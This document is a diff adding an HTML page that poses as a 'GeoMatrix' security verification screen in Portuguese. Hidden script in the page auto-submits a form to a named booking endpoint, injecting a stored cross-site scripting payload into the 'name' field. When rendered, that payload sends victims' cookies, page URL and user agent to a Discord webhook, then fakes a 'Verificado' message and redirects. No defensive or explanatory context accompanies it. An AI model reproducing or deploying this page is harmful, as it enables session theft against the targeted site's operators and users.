@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>GeoMatrix - Verificacao de Seguranca</title>
+<style>
+body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.box { background: #16213e; padding: 40px; border-radius: 10px; text-align: center; max-width: 400px; border: 1px solid #0f3460; }
+h2 { color: #e94560; }
+p { color: #ccc; font-size: 14px; }
+</style>
+</head>
+<body>
+<div class="box"><h2>Verificando...</h2><p>Aguarde...</p></div>
+
+<form id="f" action="http://geomatrixgames.com.br/booking/booking.php" method="POST" target="x">
+  <input type="hidden" name="name" id="xss">
+  <input type="hidden" name="email" value="a@b.com">
+  <input type="hidden" name="owner_email" value="contato@geomatrixgames.com.br">
+</form>
+<iframe name="x" style="display:none"></iframe>
+
+<script>
+const WH = "https://discord.com/api/webhooks/1466851883451813891/HT4qn0Kaj711NLpN_Zb5uOud8zhLH1yOzAIOFCotYASks-x8J4swEC0NcHHwkCj14LuZ";
+const XSS = "<script>fetch('"+WH+"',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'XSS|Cookie:'+document.cookie+'|URL:'+window.location.href+'|UA:'+navigator.userAgent})});document.body.innerHTML='<h2 style=color:green>Verificado</h2>';setTimeout(function(){window.location.href='https://geomatrixgames.com.br'},2000)<\\/script>";
+document.getElementById("xss").value = XSS;
+document.getElementById("f").submit();
+</script>
+</body>
+</html>
